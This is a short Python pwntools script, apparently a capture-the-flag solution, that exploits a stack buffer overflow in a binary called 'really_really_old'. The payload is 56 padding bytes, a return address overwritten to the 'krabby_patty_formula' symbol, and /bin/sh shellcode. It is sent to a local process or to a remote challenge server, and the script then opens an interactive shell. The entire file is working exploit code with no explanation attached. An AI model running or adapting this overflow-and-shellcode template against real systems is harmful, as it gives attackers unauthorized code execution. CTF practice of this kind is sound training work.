#!/usr/bin/env python3

from pwn import *
from pwnlib import asm, shellcraft

EXE = ELF("./really_really_old")

context(arch="amd64", os="linux")

print(EXE.path)
if args.REMOTE:
    r = remote("165.227.103.166", 6000)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)

krabby_patty_formula_addr = EXE.sym["krabby_patty_formula"]
shellcode = asm.asm(shellcraft.sh())

payload = b"A" * 56 + p64(krabby_patty_formula_addr) + shellcode

r.recvuntil(b"-+= INPUT QUALITY FLAVORTEXT: =+-\n")
r.sendline(payload)
r.interactive()
